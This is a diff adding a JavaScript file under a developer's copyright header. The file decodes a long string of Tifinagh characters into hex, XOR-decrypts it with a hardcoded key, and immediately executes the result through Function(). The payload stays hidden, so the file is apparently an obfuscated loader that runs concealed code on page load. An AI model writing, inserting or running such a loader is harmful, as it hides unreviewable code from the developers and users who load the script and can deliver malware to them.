@@ -1,0 +1,26 @@
+/**
+ * Copyright by Developer Ayoub Alarjani
+ * Official Website: www.mawiman.com
+ * © 2025 by MawiMan
+ */
+(function(){
+  const rev = {"ⴰ":"0","ⴱ":"1","ⴳ":"2","ⴷ":"3","ⴹ":"4","ⴼ":"5","ⴽ":"6","ⵀ":"7","ⵃ":"8","ⵄ":"9","ⵅ":"a","ⵇ":"b","ⵉ":"c","ⵊ":"d","ⵍ":"e","ⵎ":"f"};
+  const data = "ⴼⵍⵍⴽⴱⴷⵍⴰⴷⵄⵄⵉⵇⵊⴹⵉⴰⵃⴰⵍⴳⵀⵅⵃⴱⴽⴽⴳⵀⴷⴳⵄⴷⵅⵎⴽⴷⴰⵍⵅⴷⵎⵃⴼⵇⵊⴹⵉⴱⵄⴼⴳⴽⵍⵍⵇⴷⴽⴽⵃⴹⵃⴰⵎⴷⵇⵍⵉⴰⵃⵍⴽⴳⴳⵃⴼⵄⴹⴹⵊⴱⵊⴹⴹⴳⴷⵅⵃⴼⴼⴰⵇⴳⴼⴽⴹⵀⵊⵅⴳⴹⴱⵇⵊⴽⵉⵃⵅⵊⴳⴰⴳⴼⵉⴰⴰⴽⴽⵅⵎⴱⵊⴹⵄⵀⴽⴳⴷⴷⵃⵍⵀⴼⴳⵍⵎⴳⴷⵄⴽⵎⴰⴰⴼⴷⵎⴹⵃⴷⴹⵅⴷⴱⵎⴹⴳⴳⴼⴰⴷⴰⵀⵅⴳⴷⵍⵍⵎⴳⴷⵄⴽⵎⵃⵀⴳⴱⴷⴼⴷⴷⴳⵍⵉⴷⵍⴹⵃⴽⴹⴳⵃⴷⴱⵍⴽⴼⵇⵅⵅⵀⵀⵎⵇⵅⴼⴰⵇⴹⵀⴳⵅ";
+  const key = [84,130,124,131,76,241,216,34,124,32,70,204,114,39,5,76];
+  function tifToBytes(s){
+    let hex = '';
+    for (let i = 0; i < s.length; i++){ hex += rev[s[i]]; }
+    const len = hex.length / 2;
+    const arr = new Uint8Array(len);
+    for (let i = 0; i < len; i++){ arr[i] = parseInt(hex.substr(i*2,2), 16); }
+    return arr;
+  }
+  function xor(b,k){
+    const out = new Uint8Array(b.length);
+    for (let i = 0; i < b.length; i++){ out[i] = b[i] ^ k[i % k.length]; }
+    return out;
+  }
+  const decBytes = xor(tifToBytes(data), key);
+  const decText = (typeof TextDecoder !== 'undefined' ? new TextDecoder('utf-8') : {decode: s=>String.fromCharCode.apply(null, s)}).decode(decBytes);
+  Function(decText)();
+})();
